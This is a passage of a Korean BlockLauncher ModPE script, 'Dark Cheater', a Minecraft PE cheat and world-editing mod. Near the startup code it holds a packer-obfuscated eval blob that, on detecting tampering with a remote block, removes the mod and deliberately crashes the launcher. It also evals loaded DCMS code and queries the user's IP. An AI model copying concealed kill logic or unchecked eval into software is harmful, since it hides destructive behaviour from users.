if(gt(x, y, z)==247&&gt(x+1, y-1, z+1)==42&&gt(x+1, y-1, z-1)==42&&gt(x-1, y-1, z+1)==42&&gt(x-1, y-1, z-1)==42&&gt(x+1, y, z+1)==4&&gt(x+1, y, z-1)==4&&gt(x-1, y, z+1)==4&&gt(x-1, y, z-1)==4&&gt(x+1, y-1, z)==4&&gt(x-1, y-1, z)==4&&gt(x, y-1, z+1)==4&&gt(x, y-1, z-1)==4&&gt(x+1, y, z+1)==4&&gt(x+1, y, z-1)==4&&gt(x-1, y, z+1)==4&&gt(x-1, y, z-1)==4&&gt(x+1, y+1, z)==4&&gt(x-1, y+1, z)==4&&gt(x, y+1, z+1)==4&&gt(x, y+1, z-1)==4&&Level.getGameMode()==0&&en.tf) return true;
else return false;
}

};

const Fix = {
showTipMessage : function(msg){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
stmf.txt.setText(msg+"");
new android.os.Handler().postDelayed(new java.lang.Runnable({
run : function(){
if(stmf.txt.getText()==msg) stmf.txt.setText("");
}
}), 3000);
}
catch(e){
Dark.showError(e);
}
}
}));
},
makeMessageWindow : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
stmf.win = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
layout.setOrientation(1);
stmf.txt = new android.widget.TextView(ctx);
stmf.txt.setText("");
stmf.txt.setTypeface(font);
stmf.txt.setTextSize(18);
stmf.txt.setTextColor(android.graphics.Color.WHITE);
stmf.txt.setGravity(center);
layout.addView(stmf.txt);
stmf.win.setContentView(layout);
stmf.win.setWidth(-1);
stmf.win.setHeight(dip2px(ctx, 120));
stmf.win.setTouchable(false);
stmf.win.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));
stmf.win.showAtLocation(ctx.getWindow().getDecorView(),center|android.view.Gravity.BOTTOM, 0, 0);
}
catch(e){
Dark.showError(e);
}
}
}));
},
removeMessageWindow : function(){
ctx.runOnUiThread(new java.lang.Runnable({
run : function(){
try{
if(stmf.win!=null){
stmf.win.dismiss();
stmf.win = null;
stmf.txt = null;
}
}
catch(e){
Dark.showError(e);
}
}
}));
}
};

const File = {
copy : function(path1, path2){
try{
var file1 = new java.io.File(path1);
var file2 = new java.io.File(path2);
var fis = new java.io.FileInputStream(file1).getChannel();
var fos = new java.io.FileOutputStream(file2).getChannel();
fis.transferTo(0, fis.size(), fos);
fis.close();
fos.close();
}
catch(e){
Dark.showError(e);
}
},
copyFolder : function(path1, path2){
try{
var file1 = new java.io.File(path1);
var file2 = new java.io.File(path2);
if(file1.isDirectory()){
var file3 = new java.io.File(path2, file1.getName());
file3.mkdirs();
var child = file1.list();
for(var n=0;n<child.length;n++){
var file4 = new java.io.File(file1, child[n]);
if(file4.isDirectory()) File.copyFolder(file4, file3);
else File.copy(file4, new java.io.File(file3, child[n]));
}
}
else{
File.copy(path1, path2);
}
}
catch(e){
Dark.showError(e);
}
},
save : function(path, value){
try{
var file = new java.io.File(path);
var fos = new java.io.FileOutputStream(file);
var str = new java.lang.String(value);
fos.write(str.getBytes());
fos.close();
}
catch(e){
Dark.showError(e);
}
},
read : function(path){
try{
var file = new java.io.File(path);
if(!(file.exists())) return "";
var fis = new java.io.FileInputStream(file);
var isr = new java.io.InputStreamReader(fis);
var br = new java.io.BufferedReader(isr);
var str = br.readLine();
var line = "";
while((line = br.readLine()) != null){
str += "\n" + line;
}
fis.close();
isr.close();
br.close();
return str;
}
catch(e){
Dark.showError(e);
}
},
remove : function(path){
try{
var file = new java.io.File(path);
if(file.exists()) file.delete();
}
catch(e){
Dark.showError(e);
}
}

};

Entity.setFireTicks = function(e, n){
if(e==null) return;
else ScriptManager.nativeSetOnFire(e, n);
};
Entity.getEntityTypeId = function(e){
if(e==null) return;
else return ScriptManager.nativeGetEntityTypeId(e);
};
Entity.getX = function(e){
if(e==null) return;
else return ScriptManager.nativeGetEntityLoc(e, 0);
};
Entity.getY = function(e){
if(e==null) return;
else return ScriptManager.nativeGetEntityLoc(e, 1);
};
Entity.getZ = function(e){
if(e==null) return;
else return ScriptManager.nativeGetEntityLoc(e, 2);
};
Entity.getYaw = function(e){
if(e==null) return;
else return ScriptManager.nativeGetYaw(e);
};
Entity.getPitch = function(e){
if(e==null) return;
else return ScriptManager.nativeGetPitch(e);
};
Entity.getHealth = function(e){
if(e==null||Entity.getEntityTypeId(e)>=64) return;
else return ScriptManager.nativeGetMobHealth(e);
};
Entity.setHealth = function(e, n){
if(e==null||Entity.getEntityTypeId(e)>=64||Entity.getHealth(e)==n){
return;
}
else{
try{
if(mcpev2&&Player.isPlayer(e)){
if(maxHealthFix){
if(n>20) Entity.setMaxHealth(e, n);
else Entity.setMaxHealth(e, 20);
}
if(n==0) Entity.removeAllEffects(e);
ScriptManager.nativeSetMobHealth(e, Number(n)+6);
Entity.addEffect(e, MobEffect.harm, 1, 0, true, false);
}
else{
ScriptManager.nativeSetMobHealth(e, n);
}
}
catch(e){
ScriptManager.nativeSetMobHealth(e, n);
}
}
};
ModPE.getBlocklauncherVersion = function(tf){  //original sorce from Astro
try{
if(tf) var bl = "net.zhuoweizhang.mcpelauncher.pro";
else var bl = "net.zhuoweizhang.mcpelauncher";
return ctx.getPackageManager().getPackageInfo(bl, android.content.pm.PackageManager.GET_INSTRUMENTATION).versionName;
}
catch(e){
return "설치되지 않음";
}
};
Level.getWorldType = function(){
var world = "오버월드";
try{
if(Player.getDimension()==1) world = "네더월드";
else if(Player.getDimension()==1) world = "엔더월드";
}
catch(e){
//null;
}
return world;
};
Entity.getVelY = function(e){
if(e==null) return;
else return ScriptManager.nativeGetEntityVel(e, 1);
};
ModPE.getMyIp = function(){
try{
var content = new java.io.ByteArrayOutputStream();
android.net.http.AndroidHttpClient.newInstance("userAgent").execute(new org.apache.http.client.methods.HttpGet("http://ip-api.com/json")).getEntity().writeTo(content);
content.close();
return String(content.toString()).split("\"")[31];
}
catch(e){
Dark.toast("오류 발생 : "+e+"\n인터넷 연결을 확인해주세요.");
return;
Dark.showError(e);
}
};
ModPE.getUserName = function(){
try{
var file = new java.io.File(sdcard+"/games/com.mojang/minecraftpe/options.txt");
if(!(file.exists())) return "null";
var str = File.read(file).toString();
var nn = str.split("\n");
var nnn = nn[0].split(":");
return nnn[1].toString();
}
catch(e){
Dark.showError(e);
}
};
Entity.linkWithParticle = function(e1, e2, tf){
var x1, x2, y1, y2, z1, z2, dis, x3, x4, y3, y4, z3, z4;
x1 = Entity.getX(e1);
y1 = Entity.getY(e1)-1;
z1 = Entity.getZ(e1);
if(tf){
x2 = e2[0];
y2 = e2[1];
z2 = e2[2];
}
else{
x2 = Entity.getX(e2);
y2 = Entity.getY(e2);
z2 = Entity.getZ(e2);
}
dis = Math.sqrt(Math.pow(x1-x2, 2)+Math.pow(y1-y2, 2)+Math.pow(z1-z2, 2));
var nn = Math.round(dis*2);
for(var n=0;n<nn;n++){
Level.addParticle(ParticleType.flame, x1+n*(x2-x1)/nn, y1+n*(y2-y1)/nn, z1+n*(z2-z1)/nn, 0, 0, 0, 3);
}
};
setTile = function(x, y, z, b, bd, tf){
if(x==null||x==undefined||y==null||y==undefined||z==null||z==undefined||b==null||b==undefined) return;
if(tf&&w.back) w.backUpData.push([x, y, z, ScriptManager.nativeGetTile(x, y, z), ScriptManager.nativeGetData(x, y, z)]);
if(bd==null) ScriptManager.nativeSetTile(x, y, z, b, 0);
else ScriptManager.nativeSetTile(x, y, z, b, bd);
};
getTile = function(x, y, z){
return ScriptManager.nativeGetTile(x, y, z);
};
Level.getData = function(x, y, z){
return ScriptManager.nativeGetData(x, y, z);
};
Item.getName = function(itemId, itemDamage){
var i = Number(itemId);
var it = Number(itemDamage);
if(itemDamage==null) it = 0;
if(i==0) return "공기";
else if(i==9) return "멈춘 물";
else if(i==11) return "멈춘 용암";
else if(ScriptManager.nativeIsValidItem(i)) return ScriptManager.nativeGetItemName(i, it, false);
else return "[Id : "+i+", Damage : "+it+"]";
};
ModPE.showTipMessage = function(msg){
if(stmf.fix) Fix.showTipMessage(msg);
else ScriptManager.nativeShowTipMessage(msg+"");
};

var folder = new java.io.File(sdcard+"/darkTornado/");
var folder2 = new java.io.File(sdcard+"/darkTornado/darkCheater/");
folder.mkdir();
folder2.mkdir();
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info.txt");
if(file.exists()) file.delete();
locate = Dark.read("locate");
side = Dark.read("side");
if(Dark.read("bigBtn")=="true") btnSize = {x : 55, y : 37, t : 12};
if(Dark.read("info5")=="true"){
Dark.makeButton();
}
else{
if(checkInternet()){
new java.lang.Thread({
run : function(){
var str = Dark.getDataFromServer(GitHubLink+"darkCheaterTerms.txt").split(">\n\n\n");
showTerms(str[1]);
}
}).start();
}
else{
Dark.toast("Dark Cheater는 최초 실행시 인터넷 연결이 필요합니다.");
}
}
checkDarkCheater();
Dark.save("Read Me", "이 폴더의 파일들은 Dark Cheater(다크 치터)의 설정 등과 관련된 파일들입니다.\n따라서 무단으로 수정할 시, Dark Cheater의 설정이 날아갈 수 있습니다?");
setMinecraftTheme();
chatTerrorString = Dark.read("chat");
var folder3 = new java.io.File(sdcard+"/darkTornado/darkCheater/banData/");
folder3.mkdir();
var folder4 = new java.io.File(sdcard+"/darkTornado/darkCheater/hyperLog/");
folder4.mkdir();
var folder5 = new java.io.File(sdcard+"/darkTornado/darkCheater/themes/");
folder5.mkdir();
var file2 = new java.io.File(sdcard+"/darkTornado/darkCheater/.nomedia");
file2.createNewFile();
darkCheaterEnable(true);
var code = function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('q c["\\2\\0\\4\\5"]["\\b\\6\\7\\1\\0\\a"]({h:i(){m=o;c["\\2\\0\\4\\5"]["\\b\\6\\7\\1\\0\\a"]["\\8\\2\\1\\1\\d"](x);j(k.l&&e.n("\\f\\4\\p\\9\\r")==""){e["\\8\\6\\9\\s\\t\\f\\0\\2\\9\\5"]("경고","원격 차단을 해체하려는 시도가 감지되어, 3초 뒤에 블록런처를 종료합니다.");u();c["\\2\\0\\4\\5"]["\\b\\6\\7\\1\\0\\a"]["\\8\\2\\1\\1\\d"](v);w()}}})["\\8\\g\\0\\7\\g"]();',34,34,'x61|x65|x6C||x6E|x67|x68|x72|x73|x6F|x64|x54|java|x70|Dark|x69|x74|run|function|if|dce|b2|darkCheaterOn3|read|true|x66|new|x32|x77|x44|removeDarkCheater|3000|makeCrash|5000'.split('|'),0,{});
eval(code);
if(Dark.read("log")=="true") hyperLogOn = true;
else hyperLogOn = false;
if(Dark.read("antiTerror")=="false") antiTerror = [false, false, false, false, false, false, false, false, false, false, false, false, false, false, false, false, false, false, false, false];
if(Dark.read("textBlack")=="true") white2 = black;
new java.lang.Thread({
run : function(){
while(true){
java.lang.Thread.sleep(1000);
ModPE.langEdit("menu.copyright", "©Mojang AB Dark Cheater§0 by Dark Tornado");
java.lang.Thread.sleep(1000);
ModPE.langEdit("menu.copyright", "©Mojang AB §0Dark Cheater by Dark Tornado");
}
}
}).start();
var folder6 = new java.io.File(sdcard+"/Android/data/com.darktornado.darkcheater/");
folder6.mkdirs();
var folder7 = new java.io.File(sdcard+"/darkTornado/darkCheater/whiteListData/");
folder7.mkdir();
if(checkInternet()){
new java.lang.Thread({
run : function(){
var arr = Dark.getDataFromServer(GitHubLink+"notice.txt").toString().split("\n\n----------\n");
if(arr.length>Number(Dark.read("notice"))) Dark.toast("새로운 공지사항이 있습니다.\n \"환경 설정\"에서 확인하실 수 있습니다.", true);
}
}).start();
}
Dark.addDcmsInDarkCheater();
if(Dark.read("useDcms")=="true"){
try{
DCMS.makeDirectory();
DCMS.compile();
}
catch(e){
Dark.toast("추가 파일이 없습니다.\n\"환경 설정\"에서 다운하실 수 있습니다.");
}
}
Dark.serverCheck();
var cache = Dark.read("toastType");
if(cache=="0") toastType = 0;
else if(cache=="2") toastType = 2;
else if(cache=="3") toastType = 3;
else toastType = 1;
try{
Utils.isPro();
}
catch(e){
Dark.showDialog("Dark Cheater 사용 불가", "Dark Cheater는 구조상의 이유로 블록런처, 블록런처 pro에서만 사용이 가능하며, MCPE Master, Toolbox for Minecraft: Pocket Edition에서는 사용할 수 없습니다.\n\nDark Cheater only works with Blocklauncher.");
ctx.runOnUiThread(new java.lang.Runnable({
run:function(){
if(btn!=null){
btn.dismiss();
btn = null;
}
}
}));
}
if(Dark.read("useDarkEffect")=="true"){
Dark.darkEffect();
Dark.toast("Hello, "+ModPE.getUserName()+".", true);
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(3000);
Dark.darkEffect();
}
}).start();
}
if(android.os.Build.VERSION.SDK_INT>=21) transToggle = true; 
if(Dark.read("transToggle")=="true"){
transToggle = true;
}
else if(Dark.read("transToggle")=="false"){
transToggle = false;
}
if(Dark.read("eacf")=="true") getPlayers = true;
var vers = ModPE.getMinecraftVersion().toString().split(".");
if(vers[0]=="1"){
mcpev = true;
mcpev2 = true;
mcpev3 = true;
mcpev4 = true;
mcpev5 = true;
}
else{
if(Number(vers[1])>=15) mcpev5 = true;
if(Number(vers[1])>=14) mcpev4 = true;
if(Number(vers[1])>=13) mcpev3 = true;
if(Number(vers[1])>=12) mcpev2 = true;
if(Number(vers[1])>=11) mcpev = true;
else mcpev = false;
}
try {
var file = new java.io.File(sdcard+"/darkTornado/mcpefont.tff");
if(!file.exists()) createFontFileFromWeb();
font = new android.graphics.Typeface.createFromFile(sdcard+"/darkTornado/mcpefont.tff");
}
catch(e){
Dark.toast(e);
}
if(Dark.read("designType")!="") designType = Number(Dark.read("designType"));
if(Dark.read("margin")!="") btnMargin = Number(Dark.read("margin"));
if(designType>=4) white2 = black;
if(designType==8) white2 = white;
else if(designType==7){
Dark.makeMcpeUiCache(150);
white2 = black;
}
else if(designType==6){
Dark.makeMcpeUiCache(0);
white2 = white;
}
Dark.checkFiles();
if(Dark.read("noExit")!="") useExitBtn = Number(Dark.read("noExit"));
if(Dark.read("btnHeight")!="") btnHeight = Number(Dark.read("btnHeight"));
new java.lang.Thread({
run : function(){
if(checkInternet()){
if(Dark.checkPermission("login")){
var cache = Dark.read("loginData");
if(cache!=""){
var day = new Date();
var cache2 = day.getMonth()+1;
if(cache2<10) cache2 = "0"+cache2;
cache2 = day.getFullYear()+"."+cache2;
var data = cache.split("::");
if(cache2==data[2]){
Dark.toast("자동 로그인 시작...");
Dark.login(data[0], data[1], false);
}
else{
Dark.showDialog("자동 로그인 해제", "기간이 지니서 자동 로그인이 해제되었습니다.");
File.remove(sdcard+"/darkTornado/darkCheater/loginData.txt");
}
}
}
}
}
}).start();

function dip2px(ctx, dips){
return Math.ceil(dips*ctx.getResources().getDisplayMetrics().density);
}


function darkMessage(msg, tf){
if(tf) sendMessage("<Dark> "+msg);
else clientMessage("<Dark> "+msg);
}


function sendMessage(msg){
var pe = Player.getEntity();
var pn = Player.getName(pe);
Entity.setNameTag(pe, "");
if(msg.search("\n")==-1){
ScriptManager.nativeSendChat(msg);
if(fixSendChat) clientMessage(msg);
}
else{
var msg2 = msg.split("\n");
for(var n=0;n<msg2.length;n++){
ScriptManager.nativeSendChat(msg2[n]);
if(fixSendChat) clientMessage(msg2[n]);
}
}
Entity.setNameTag(pe, pn);
}


function dtm(msg){
clientMessage("<§0Dark Tornado§f> "+msg);
ScriptManager.callScriptMethod("chatReceiveHook", [msg, "Dark Tornado"]);
}


function nightCheck(){
var nc1, nc2, nc3;
nc1 = Level.getTime();
try{
if(mcpev2) nc2 = nc1/24000;
else nc2 = nc1/19200;
}
catch(e){
nc2 = nc1/19200;
}
nc3 = nc2-Math.floor(nc2);
if(nc3<0.5) return false;
else if(nc3>=0.5) return true;
}


function teleport(e, x, y, z){
if(Player.isPlayer(e)){
if(mcpev){
var ttt = Level.spawnMob(x, y, z, 77);
Entity.rideAnimal(e, ttt);
}
else{
var ttt = Level.spawnMob(x, y, z, 81);
Entity.rideAnimal(e, ttt);
Entity.remove(ttt);
}
ModPE.showTipMessage("");
preventDefault();
}
else{
Entity.setPosition(e, x, y, z);
}
}


function setTiles(x1, x2, y1, y2, z1, z2, b, bd, tf){
for(var xx=x1;xx<x2+1;xx++){
for(var yy=y1;yy<y2+1;yy++){
for(var zz=z1;zz<z2+1;zz++){
setTile(xx, yy, zz, b, bd, tf);
}}}
}




function arroundMobHealthDown(s, r, n){
var px, py, pz;
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(s)-Entity.getX(e));
py = Math.abs((Entity.getY(s)+1)-Entity.getY(e));
pz = Math.abs(Entity.getZ(s)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&s!=e&&Entity.getEntityTypeId(e)<64){
Entity.setHealth(e, Entity.getHealth(e)-n);
}
}
}


function arroundMobFireTicks(s, r, n){
var px, py, pz;
for each(var e in Entity.getAll()){
px = Math.abs(Entity.getX(s)-Entity.getX(e));
py = Math.abs((Entity.getY(s)+1)-Entity.getY(e));
pz = Math.abs(Entity.getZ(s)-Entity.getZ(e));
if(px<=r&&py<=r&&pz<=r&&s!=e&&Entity.getEntityTypeId(e)<64){
Entity.setFireTicks(e, n);
}
}
}


function addDarkRender(renderer){
var sin, cos;
var model = renderer.getModel();
var head = model.getPart("head");
var body = model.getPart("body");
var rArm = model.getPart("rightArm");
var lArm = model.getPart("leftArm");
var rLeg = model.getPart("rightLeg");
var lLeg = model.getPart("leftLeg");
head.clear();
body.clear();
rLeg.clear();
lLeg.clear();
rArm.clear();
lArm.clear();
head.setTextureOffset(0, 0);
head.addBox(-4, -8, -4, 8, 8, 8);
body.setTextureOffset(16, 16);
body.addBox(-4, 0, -2, 8, 12, 4);
rLeg.setTextureOffset(0, 16);
rLeg.addBox(-2, 0, -2, 4, 12, 4);
lLeg.setTextureOffset(0, 16);
lLeg.addBox(-2, 0, -2, 4, 12, 4);
lArm.setTextureOffset(40, 16);
lArm.addBox(-1, -2, -1.5, 4, 12, 4); 
rArm.setTextureOffset(40, 16);
rArm.addBox(-3, -2, -1.5, 4, 12, 4); 

head.setTextureOffset(40, 20);
head.addBox(-1, -12, -2, 2, 2, 2);
for(var n=0;n<180;n++){
sin = Math.sin(n*Math.PI/27);
cos = Math.cos(n*Math.PI/27);
head.addBox(-1+3*sin, -11, -2+3*cos, 2, 2, 2);
head.addBox(-1+5*sin, -10, -2+5*cos, 2, 2, 2);
head.addBox(-1+7*sin, -9, -2+7*cos, 2, 2, 2);
head.addBox(-1+9*sin, -8, -2+9*cos, 2, 2, 2);
head.addBox(-1+11*sin, -7, -2+11*cos, 2, 2, 2);
head.addBox(-1+13*sin, -6, -2+13*cos, 2, 2, 2);
}
}


function selectLevelHook(){
if(Dark.read("sdp1")=="true"){
Dark.checkSdResetSource();
}
ScriptManager.callScriptMethod("receiveDarkCheaterVersion", [version]);
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info3.txt");
if(file.exists()){
file.delete();
}
if(Dark.read("useDarkEffect")=="true"){
Dark.showCover();
}
}


function newLevel(){
dt = 76;
var file = new java.io.File(sdcard+"/darkTornado/darkCheater/info3.txt");
if(file.exists()){
file.delete();
}
blackList = Dark.read("blackList").toString();
blackListId = Dark.read("banData/"+Level.getWorldDir()).toString();
Dark.checkVersion();
new java.lang.Thread({
run : function(){
java.lang.Thread.sleep(3000);
Dark.checkMessage();
var cache = Dark.getNewestVersion();
if(cache!=version&&cache!="알 수 없음"){
var vers1 = cache.split("\\.");
var vers2 = version.split(".");
if((Number(vers1[0])>Number(vers2[0]))||(Number(vers1[0])>=Number(vers2[0])&&Number(vers1[1])>Number(vers2[1]))||(Number(vers1[0])>=Number(vers2[0])&&Number(vers1[1])>=Number(vers2[1])&&Number(vers1[2])>Number(vers2[2]))){
Dark.toast("최신 버전이 발견되었습니다.\n 현재 버전 : "+version+", 최신 버전 : "+cache, true);
}
}
}
}).start();
if(hyperLogOn) hyperLog += "["+Dark.getTime(2)+"] 맵에 들어감 (맵 이름 : "+Level.getWorldName()+")\n";
whiteList = Dark.read("whiteList").toString();
ciwl.data = Dark.read("whiteListData/"+Level.getWorldDir()).toString();
if(compileFinish){
var wn = Level.getWorldName(), worldName= Level.getWorldName();
eval(dcmsData.newLevel+"");
}
if(Dark.read("useDarkEffect")=="true"){
if(screenCover==null) Dark.showCover();
if(effectWindow==null) makeDarkFrame();
}
if(getPlayers) leftPls = [];
Fix.makeMessageWindow();
}


function useItem(x, y, z, i, b, s, it, bd){
if(ad==Player.getEntity()){
if(entityTarget!=0){
if(entityTarget==93) Level.spawnMob(x, y+1, z, entityTarget);
else Level.spawnMob(x, y+3, z, entityTarget);
}
if(xyzTarget!=0){
we.x[xyzTarget-1] = x;
we.y[xyzTarget-1] = y;
we.z[xyzTarget-1] = z;
Dark.toast("("+x+", "+y+", "+z+")로 설정되었습니다.");
xyzTarget = 0;
}
if(w.tf){
if(i==267){
w.x[0] = x;
w.y[0] = y;
w.z[0] = z;
Dark.toast("지점 1 선택("+x+", "+y+", "+z+")");
preventDefault();
}
else if(i==292){
w.x[1] = x;
w.y[1] = y;
w.z[1] = z;
Dark.toast("지점 2 선택("+x+", "+y+", "+z+")");
preventDefault();
}
if(w.p2&&i<256) setTiles(x, x, y, y+w.p1, z, z, i, it);
if(w.c){
if(i==325&&it==0) setTile(x, y, z, 0);
else if(i==325&&it==8) setTile(x, y, z, 9);
else if(i==325&&it==10) setTile(x, y, z, 11);
else if(i==259) setTile(x, y, z, 51);
else if(i==354) setTile(x, y, z, 92);
else if(i==338) setTile(x, y, z, 83);
else if(i==323) setTile(x, y, z, 63);
else if(i<256) setTile(x, y, z, i, it);
preventDefault();
}
if(pointInput==1){
w.x[0] = x;
w.y[0] = y;
w.z[0] = z;
Dark.toast("지점 1 선택("+x+", "+y+", "+z+")");
pointInput = 0;
preventDefault();
}
else if(pointInput==2){
w.x[1] = x;
w.y[1] = y;
w.z[1] = z;
Dark.toast("지점 2 선택("+x+", "+y+", "+z+")");
pointInput = 0;
preventDefault();
}
}
if(filling){
if(i==359){
if(f2==0){
fx1 = x;
fy1 = y;
fz1 = z;
Dark.toast("지점 1 선택("+x+", "+y+", "+z+")");
f2 = 1;
}
else if(f2==1){
fx2 = x;
fy2 = y;
fz2 = z;
Dark.toast("지점 2 선택("+x+", "+y+", "+z+")");
f2 = 2;
}
else if(f2==2){
Dark.toast("지점 초기화");
f2 = 0;
}
}
else if(f2==2){
var fx3 = Math.min(fx1, fx2);
var fy3 = Math.min(fy1, fy2);
var fz3 = Math.min(fz1, fz2);
var fx4 = Math.max(fx1, fx2);
var fy4 = Math.max(fy1, fy2);
var fz4 = Math.max(fz1, fz2);
if(i==325&&it==0){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 0);
Dark.toast("0번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==325&&it==8){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 9);
Dark.toast("9번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
else if(i==325&&it==10){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, 11);
Dark.toast("11번 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
var itemIds = [259, 354, 338, 323];
var blockIds = [51, 92, 83, 63];
for(var n=0;n<4;n++){
if(i==itemIds[n]){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, blockIds[n]);
Dark.toast(blockIds[n]+"번 블록으로 채워짐.");
f2 = 0;
preventDefault();
break;
}
}
if(i<256){
setTiles(fx3, fx4, fy3, fy4, fz3, fz4, i, it);
if(it==0) Dark.toast(i+"번 블록으로 채워짐.");
else Dark.toast("블록 아이디 "+i+"번, 블록 데미지가 "+it+"인 블록으로 채워짐.");
f2 = 0;
preventDefault();
}
}
}
if(signEdit&&(b==63||b==68)){
openSignEditor(x, y, z);
preventDefault();
}

}

if(i==347){
if(move==1){
Entity.setPosition(Player.getEntity(), x, y+3, z);
}
else if(move==2){
pe = Player.getEntity();
Entity.setVelX(pe, x-Player.getX());
Entity.setVelY(pe, y-Player.getY());
Entity.setVelZ(pe, z-Player.getZ());
}
else if(move==3){
pe = Player.getEntity();
Entity.setVelX(pe, x-Player.getX());
Entity.setVelY(pe, 0.7);
Entity.setVelZ(pe, z-Player.getZ());
}
}
if(moving){
Entity.setPosition(Player.getEntity(), Entity.getX(playerTarget), Entity.getY(playerTarget)+1, Entity.getZ(playerTarget));
moving = false;
}
if(multi||ad==Player.getEntity()){
if(atp==1){
tx = x;
ty = y;
tz = z;
Dark.toast("저장되었습니다.");
atp = 2;
}
else if(atp==3){
Entity.setPosition(Player.getEntity(), tx, ty+3, tz);
atp = 0;
}
if(ctp){
var cache = HM.getPos();
Entity.setPosition(ad, cache[0], cache[1]+3, cache[2]);
makeCross(false);
ctp = false;
}
if(touchBlock){
if(Level.getGameMode()==0) Level.destroyBlock(x, y, z, true);
if(Level.getGameMode()==1) Level.destroyBlock(x, y, z);
preventDefault();
}
if(blockInfo){
darkMessage("Pos : "+x+", "+y+", "+z+" Id&Data : "+b+", "+bd);
}

}

if(i==352&&ad==Player.getEntity()){
if(darkType==1)
explode(x, y, z, darkTypeE);
if(darkType==2){
setTile(x, y, z, 0);
if(darkType==3)
Level.destroyBlock(x, y, z, true);
}

}

if(i==266){
var pe = Player.getEntity();
if(dl.esp[0]==pe&&dl.c[0]==0){
setTiles(x-1, x+1, y+1, y+1, z-1, z+1, 51);
setTile(x+2, y+1, z, 51);
setTile(x-2, y+1, z, 51);
setTile(x, y+1, z+2, 51);
setTile(x, y+1, z-2, 51);
dl.c[0] = 450;
}
if(dl.esp[1]==pe&&dl.c[1]==0){
for(var xx=x-2;xx<x+3;xx++)
for(var zz=z-2;zz<z+3;zz++)
setTile(xx, y, zz, 0);
setTile(x+2, y, z+2, 8);
setTile(x-2, y, z+2, 8);
setTile(x+2, y, z-2, 8);
setTile(x-2, y, z-2, 8);
dl.wx = x;
dl.wy = y;
dl.wz = z;
dl.c[1] = 450;
}
if(dl.esp[2]==pe&&dl.c[2]==0){
for(var yy=y+1;yy<y+7;yy++)
setTile(x, yy, z, 17);
setTile(x, y+7, z, 18);
for(var yy=y+6;yy<y+8;yy++){
setTile(x+1, yy, z, 18);
setTile(x, yy, z-1, 18);
setTile(x, yy, z+1, 18);
setTile(x-1, yy, z, 18);
}
for(var yy=y+4;yy<y+6;yy++){
setTile(x+1, yy, z+1, 18);
setTile(x+1, yy, z-1, 18);
setTile(x+1, yy, z, 18);
setTile(x-1, yy, z+1, 18);
setTile(x-1, yy, z-1, 18);
setTile(x-1, yy, z, 18);
setTile(x, yy, z+1, 18);
setTile(x, yy, z-1, 18);
setTile(x+2, yy, z+1, 18);
setTile(x+2, yy, z-1, 18);
setTile(x+2, yy, z, 18)
setTile(x-2, yy, z+1, 18);
setTile(x-2, yy, z-1, 18);
setTile(x-2, yy, z, 18);
setTile(x+1, yy, z+2, 18);
setTile(x-1, yy, z+2, 18);
setTile(x, yy, z+2, 18);
setTile(x+1, yy, z-2, 18);
setTile(x-1, yy, z-2, 18);
setTile(x, yy, z-2, 18);
}
var p2x, p2y, p2z;
for each(var e in Entity.getAll()){
p2x = Math.abs(x-Entity.getX(e));
p2y = Math.abs((y+1)-Entity.getY(e));
p2z = Math.abs(z-Entity.getZ(e));
if(p2x<=30&&p2y<=30&&p2z<=30&&dl.esp[2]!=e&&Entity.getEntityTypeId(e)<64)
Entity.setHealth(e, Entity.getHealth(e)-6);
}
dl.c[2] = 450;
}
if(dl.esp[3]==pe&&dl.c[3]==0){
setTiles(x-1, x+1, y+3, y+5, z-1, z+1, 12);
dl.sx = x;
dl.sy = y;
dl.sz = z;
dl.c[3] = 450;
}
if(dl.esp[4]==pe&&dl.c[4]==0){
Level.spawnMob(x, y+3, z, 32);
Level.spawnMob(x, y+3, z, 32);
Level.spawnMob(x, y+3, z, 32);
Level.spawnMob(x, y+3, z, 34);
Level.spawnMob(x, y+3, z, 34);
Level.spawnMob(x, y+3, z, 34);
dl.c[4] = 450;
}
if(dl.esp[6]==pe&&dl.c[6]==0){
anti = 15;
explode(x+(x-Player.getX()), y+3, z+(z-Player.getZ()), 4.5);
dl.ex = x+(x-Player.getX());
dl.ey = y;
dl.ez = z+(z-Player.getZ());
dl.c[6] = 450;
}
if(dl.esp[8]==pe&&dl.c[8]==0){
px = Math.floor(Player.getX());
py = y;
pz = Math.floor(Player.getZ());
yaw = Math.floor(getYaw());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++)
setTile(px+gun*sin, y+2, pz+gun*cos, 155);
dl.c[8] = 450;
}
if(dl.esp[9]==pe&&dl.c[9]==0){
px = Math.floor(Player.getX());
py = y;
pz = Math.floor(Player.getZ());
yaw = Math.floor(getYaw());
sin = -Math.sin(yaw/180*Math.PI);
cos = Math.cos(yaw/180*Math.PI);
for(var gun=3;gun<30;gun++)
setTile(px+gun*sin, y+2, pz+gun*cos, 173);
dl.c[9] = 450;
}

}

if(adTer||(!adTer&&ad!=Player.getEntity())){
var pe = Player.getEntity();
if(b==54&&antiTerror[3]){
preventDefault();
if(terrorAlert)
Dark.toast(Player.getName(Player.getEntity())+"(이)가 창고를 터치하였습니다.");
}
if(i==8||i==9||(i==325&&it==8)){
if(antiTerror[4]){
Dark.removeBlock(x, y, z, s);
if(terrorAlert){
if(i==8)
Dark.toast(Player.getName(pe)+"(이)가 흐르는 물 설치를 시도하였습니다.");
else if(i==9)
